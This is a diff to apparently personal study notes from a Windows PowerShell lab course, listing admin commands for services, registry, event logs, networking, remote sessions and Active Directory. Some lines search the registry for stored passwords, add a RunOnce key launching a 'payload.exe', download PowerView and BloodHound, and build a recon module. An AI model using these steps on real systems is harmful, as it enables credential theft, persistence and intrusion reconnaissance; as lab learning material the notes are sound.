@@ -112,7 +112,7 @@ erase file-3 file-3
 del /A:R
 ```
 
-### PS TODO: 14
+### PS TODO: 
 
 ```powershell
 Get-Help Test-Wsman
@@ -158,4 +158,110 @@ Get-ADUser -Filter {EmailAddress -like '*greenhorn.corp'}
 > New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true
 Set-ADUser -Identity MTanaka -Description " Sensei to Security Analyst's Rocky, Colt, and Tum-Tum" 
 Get-ADUser -Identity MTanaka -Property Description
+new-item -name "SOPs" -type directory
+cd SOPs
+new-Item "Readme.md" -ItemType File
+Add-Content .\Readme.md "Title: Insert Document Title Here"
+Rename-Item .\Cyber-Sec-draft.md -NewName Infosec-SOP-draft.md
+get-childitem -Path *.txt | rename-item -NewName {$_.name -replace ".txt",".md"}
+Get-Help *-Service
+Get-Service | ft DisplayName,Status
+Get-Service | measure
+Get-Service | where DisplayName -like '*Defender*' | ft DisplayName, ServiceName, Status
+Start-Service WinDefend
+get-service WinDefend
+Stop-Service Spooler
+Start-Service Spooler
+Get-Service Spooler | Select-Object -Property Name, StartType, Status, DisplayName
+Set-Service -Name Spooler -StartType Disabled
+Get-Service -Name Spooler | Slect-Object -Property StartType
+get-service -ComputerName ACADEMY-ICL-DC
+Get-Service -ComputerName ACADEMY-ICL-DC | Where-Object {$_.Status -eq "Running"}
+Invoke-Command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}
+Get-ChildItem C:\Windows\System32\config\
+Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property
+Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse
+Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip
+REQ QUERY HKCU /F "Password" /t REG_SZ /S /K
+New-Item -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\ -Name TestKey
+New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access" -PropertyType String -Value "C:\Users\htb-student\Downloads\payload.exe"
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce\TestKey" /v access /t REG_SZ /d "C:\Users\htb-student\Downloads\payload.exe"
+Remove-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey -Name  "access"
+Get-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\TestKey
+ls C:\Windows\System32\winevt\logs
+wevtutil el
+wevtutil gl "Windows Powershell"
+wevtutil gli "Windows Powershell"
+wevtutil qe Security /c:5 /rd:true /f:text
+wevtutil epl System C:\system_export.evtx
+Get-WinEvent -ListLog *
+Get-WinEvent -ListLog Security
+Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message
+Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}
+Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message
+
+ipconfig /all
+arp -a
+nslookup ACADEMY-ICL-DC
+netstat -an
+get-netIPInterface
+get-NetIPAddress -ifIndex 25
+Set-NetIPInterface -InterfaceIndex 25 -Dhcp Disabled
+Set-NetIPAddress -InterfaceIndex 25 -IPAddress 10.10.100.54 -PrefixLength 24
+Get-NetIPAddress -ifindex 20 | ft InterfaceIndex,InterfaceAlias,IPAddress,PrefixLength
+Get-NetIPinterface -ifindex 20 | ft ifIndex,InterfaceAlias,Dhcp
+Restart-NetAdapter -Nme 'Ethernet 3'
+Test-NetConnection
+Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
+Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
+Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
+Start-Service sshd
+Set-Service -Name ssh -StartupType 'Automatic'
+ssh htb-student@10.129.224.248
+powershell
+winrm quickconfig
+Test-WSMan -ComputerName "10.129.224.248"
+Test-WSMan -ComputerName "10.129.224.248" -Authentication Negotiate
+Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate
+$PSVersionTable
+
+Get-Help Invoke-Webrequest
+Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method Get | Get-Member
+Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl Images
+Invoke-WebRequest -Uri "https://web.ics.purdue.edu/~gchopra/class/public/pages/webdesign/05_simple.html" -Method GET | fl RawContent
+ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"
+ python3 -m http.server 8000
+ Invoke-WebRequest -Uri "http://10.10.14.169:8000/PowerView.ps1" -Outfile "C:\Powerview.ps1"
+ (New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")
+
+ mkdir quick-recon
+ New-ModuleManifest -Path C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon\quick-recon.psd1 -PassThru
+ni quick-recon.psm1 -ItemType File
+Import-Module ActiveDirectory
+
+function Get-Recon {  
+    # Collect the hostname of our PC.
+    $Hostname = $env:ComputerName  
+    # Collect the IP configuration.
+    $IP = ipconfig
+    # Collect basic domain information.
+    $Domain = Get-ADDomain 
+    # Output the users who have logged in and built out a basic directory structure in "C:\Users\".
+    $Users = Get-ChildItem C:\Users\
+    # Create a new file to place our recon results in.
+    new-Item ~\Desktop\recon.txt -ItemType File 
+    # A variable to hold the results of our other variables. 
+    $Vars = "***---Hostname info---***", $Hostname, "***---Domain Info---***", $Domain, "***---IP INFO---***",  $IP, "***---USERS---***", $Users
+    # It does the thing 
+    Add-Content ~\Desktop\recon.txt $Vars
+  }
+Export-ModuleMember
+Export-ModuleMember -Function Get-Recon -Variable Hostname
+ Import-Module 'C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon.psm1`
+ get-module
+ 
+
 ```
